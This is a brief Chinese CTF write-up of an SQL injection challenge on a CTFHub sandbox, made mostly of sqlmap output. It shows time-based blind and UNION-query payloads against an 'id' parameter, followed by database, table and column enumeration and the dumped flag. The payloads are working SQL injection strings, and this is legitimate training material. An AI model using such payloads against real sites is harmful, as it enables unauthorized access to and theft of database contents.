---
title: 报错型sql注入
date: 2024-11-15T20:06:19Z
lastmod: 2024-11-15T20:11:13Z
---

# 报错型sql注入

```shell
Parameter: id (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 6031 FROM (SELECT(SLEEP(5)))HxQg) AND 'TYVz'='TYVz

    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: id=-6758' UNION ALL SELECT NULL,CONCAT(0x71716b6271,0x6b4f427268554c41585a6c62706e70755161624c684e6b574950737365477945575762454c567758,0x71627a6a71)-- -
---
```

```shell
[*] information_schema
[*] mysql
[*] performance_schema
[*] sqli

```

​`sqlmap -u "http://challenge-68616053fb31adea.sandbox.ctfhub.com:10800/?id=1"  `​

‍

```shell
Database: sqli
[2 tables]
+------+
| flag |
| news |
+------+
```

```shell
Database: sqli
Table: flag
[1 column]
+--------+--------------+
| Column | Type         |
+--------+--------------+
| flag   | varchar(100) |
+--------+--------------+
```

```shell
Database: sqli
Table: flag
[1 entry]
+----------------------------------+
| flag                             |
+----------------------------------+
| ctfhub{d6d7550c0c1cf1fc939bb395} |
+----------------------------------+
```

‍
